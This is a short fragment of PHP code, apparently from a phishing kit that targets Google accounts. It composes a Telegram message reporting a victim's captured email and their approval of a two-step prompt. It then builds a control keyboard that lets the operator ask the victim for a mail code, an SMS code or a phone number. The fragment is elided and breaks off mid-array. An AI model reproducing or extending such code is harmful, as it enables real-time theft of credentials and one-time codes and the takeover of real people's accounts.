...
// 📲 Message Telegram
$message_text = "
🗝️ <b>2 STEPS | GOOGLE</b>
├📩 Email : <code>$login_identifiant</code>
└🧔 L'user à cliquer sur <strong>Oui</strong> vérifie
...
$keyboard = [
    'inline_keyboard' => [
        [['text' => '❌ Authentification non valide', 'callback_data' => "2steps_error|$uid"]],
		[['text' => '📲 Validation en 2 Etapes', 'callback_data' => "2steps|$uid"]],
        [['text' => '📩 Code Mail', 'callback_data' => "code_mail|$uid"]],
        [['text' => '📲 Code sms', 'callback_data' => "code_sms|$uid"],['text' => ' 📞 N°Tel', 'callback_data' => "num|$uid"]],              
